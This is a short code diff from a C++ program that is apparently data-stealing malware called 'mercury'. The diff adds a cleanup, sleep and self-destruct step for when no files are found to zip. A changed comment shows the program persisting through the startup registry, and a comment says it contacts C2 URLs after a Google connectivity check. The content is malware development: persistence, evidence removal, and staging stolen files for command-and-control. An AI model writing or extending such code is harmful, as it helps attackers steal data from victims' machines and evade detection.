@@ -48,6 +48,9 @@ void GenZip() {
     // If there are no files to zip, then return back to caller:
     if (filesToZip.empty()) {
         std::cerr << "No files to zip." << std::endl;
+        Cleanup();
+        Sleep(2000);
+        SelfDestruct();
         return;
     }
 
@@ -72,7 +75,7 @@ int main() {
     if (ONETIMERUN) {
         // If the zip file doesn't exist, it's the first run
         if (!std::filesystem::exists(zipFile)) {
-            PersistOnMachine(); // Add mercury to startup folder
+            PersistOnMachine(); // Add mercury to startup registry
             GenZip();           // Process files and create a zip file
 
             // Try connecting to Google and then connect to all C2 URLs to find a live C2
